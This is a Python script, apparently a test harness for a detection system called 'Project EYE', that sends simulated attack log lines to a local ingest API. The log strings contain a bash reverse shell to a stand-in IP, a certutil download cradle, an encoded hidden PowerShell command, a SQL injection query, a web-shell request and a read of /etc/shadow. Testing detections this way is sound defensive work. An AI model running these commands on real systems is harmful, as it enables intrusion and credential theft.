import argparse
import asyncio
import os
import sys
import time
import httpx

API_BASE = os.getenv("EYE_API_URL", "http://127.0.0.1:8000/api/v1")

async def send_log(client: httpx.AsyncClient, source: str, raw_log: str, host: str, delay: float = 0.3):
    payload = {"source": source, "raw_log": raw_log, "host": host}
    try:
        resp = await client.post(f"{API_BASE}/events/ingest", json=payload, timeout=5.0)
        data = resp.json()
        alerts = data.get("alerts_generated", 0)
        print(f"[{source.upper()}] Ingested event {data.get('event_id')} | Alerts triggered: {alerts}")
        if alerts > 0:
            for alt in data.get("alerts", []):
                print(f"   [ALERT] TRIGGERED: {alt.get('rule_name')} (Severity: {alt.get('severity').upper()})")
    except Exception as e:
        print(f"[!] Request error: {e}")
    await asyncio.sleep(delay)

async def run_scenario(scenario_id: str):
    print("=" * 70)
    print(f"  PROJECT EYE -- ATTACK VALIDATION HARNESS [SCENARIO: {scenario_id}]")
    print("=" * 70)

    async with httpx.AsyncClient() as client:
        if scenario_id in ["LAB-01", "ALL"]:
            print("\n[*] Running LAB-01: SSH Brute Force (5 rapid failures)...")
            for i in range(1, 6):
                raw = f"Aug 22 21:05:1{i} srv-linux-01 sshd[1299]: Failed password for invalid user root from 198.51.100.77 port 4810{i} ssh2"
                await send_log(client, "linux-auth", raw, "srv-linux-01", delay=0.2)

        if scenario_id in ["LAB-02", "ALL"]:
            print("\n[*] Running LAB-02: Password Spraying across multiple user accounts...")
            for u in ["admin", "root", "devops", "deploy", "backup"]:
                raw = f"Aug 22 21:06:00 corp-dc-01 sshd[2201]: Failed password for {u} from 198.51.100.77 port 51200 ssh2"
                await send_log(client, "linux-auth", raw, "corp-dc-01", delay=0.2)

        if scenario_id in ["LAB-03", "ALL"]:
            print("\n[*] Running LAB-03: Full Multi-Stage Compromise Sequence...")
            # 1. Failures
            for i in range(1, 4):
                raw = f"Aug 22 21:07:0{i} db-prod-01 sshd[1400]: Failed password for invalid user deploy from 198.51.100.77 port 3910{i} ssh2"
                await send_log(client, "linux-auth", raw, "db-prod-01", delay=0.15)
            # 2. Success
            raw_login = "Aug 22 21:07:15 db-prod-01 sshd[1405]: Accepted password for deploy from 198.51.100.77 port 39110 ssh2"
            await send_log(client, "linux-auth", raw_login, "db-prod-01", delay=0.3)
            # 3. Sudo root
            raw_sudo = "Aug 22 21:07:20 db-prod-01 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"
            await send_log(client, "linux-auth", raw_sudo, "db-prod-01", delay=0.3)
            # 4. Reverse shell
            raw_shell = '{"host":"db-prod-01","process":"/bin/bash -i >& /dev/tcp/198.51.100.77/4444 0>&1","pid":9841,"user":"root","event_type":"suspicious_process","severity":"critical"}'
            await send_log(client, "custom", raw_shell, "db-prod-01", delay=0.3)

        if scenario_id in ["LAB-04", "ALL"]:
            print("\n[*] Running LAB-04: Sudo Root Privilege Escalation...")
            raw = "Aug 22 21:08:00 srv-app-02 sudo: analyst : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"
            await send_log(client, "linux-auth", raw, "srv-app-02", delay=0.3)

        if scenario_id in ["LAB-05", "ALL"]:
            print("\n[*] Running LAB-05: Obfuscated LOLBin & Download Cradle...")
            raw1 = '{"host":"win-srv-01","command":"certutil -urlcache -split -f http://198.51.100.77/payload.exe C:\\\\temp\\\\payload.exe","event_type":"suspicious_lolbin","severity":"high"}'
            await send_log(client, "custom", raw1, "win-srv-01", delay=0.2)
            raw2 = '{"host":"win-srv-01","command":"powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=","event_type":"obfuscated_command","severity":"high"}'
            await send_log(client, "custom", raw2, "win-srv-01", delay=0.2)

        if scenario_id in ["LAB-06", "ALL"]:
            print("\n[*] Running LAB-06: Web Application SQLi & Web Shell...")
            raw1 = '203.0.113.99 - - [22/Aug/2026:21:09:00 +0000] "GET /products.php?id=1%20UNION%20SELECT%201,username,password%20FROM%20users-- HTTP/1.1" 200 4510 "-" "sqlmap/1.7"'
            await send_log(client, "nginx", raw1, "web-portal-01", delay=0.2)
            raw2 = '203.0.113.99 - - [22/Aug/2026:21:09:15 +0000] "POST /uploads/cmd.php?cmd=whoami HTTP/1.1" 200 24 "-" "Mozilla/5.0"'
            await send_log(client, "nginx", raw2, "web-portal-01", delay=0.2)

        if scenario_id in ["LAB-07", "ALL"]:
            print("\n[*] Running LAB-07: Malicious IOC Network Connection...")
            raw = '{"host":"db-prod-01","source_ip":"198.51.100.77","destination_port":443,"event_type":"malicious_ioc_traffic","severity":"critical","threat_intel_match":"198.51.100.77 (APT-29)"}'
            await send_log(client, "custom", raw, "db-prod-01", delay=0.3)

        if scenario_id in ["LAB-08", "ALL"]:
            print("\n[*] Running LAB-08: DNS Tunneling & Periodic Beaconing...")
            raw1 = '{"host":"corp-workstation-09","event_type":"dns_tunneling_suspicion","query":"aW5maWwucGFzc3dvcmRzLmRhdGE.c2.darknet-tunnel.org","severity":"high"}'
            await send_log(client, "custom", raw1, "corp-workstation-09", delay=0.2)
            raw2 = '{"host":"corp-workstation-09","event_type":"c2_beaconing","destination_ip":"198.51.100.77","interval_seconds":30,"severity":"high"}'
            await send_log(client, "custom", raw2, "corp-workstation-09", delay=0.2)

    print("\n" + "=" * 70)
    print(" [SUCCESS] SIMULATION SEQUENCE COMPLETED!")
    print("=" * 70)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Project EYE Attack Validation Runner")
    parser.add_argument("--scenario", default="LAB-03", help="Scenario ID (LAB-01 to LAB-08, or ALL)")
    args = parser.parse_args()
    asyncio.run(run_scenario(args.scenario.upper()))
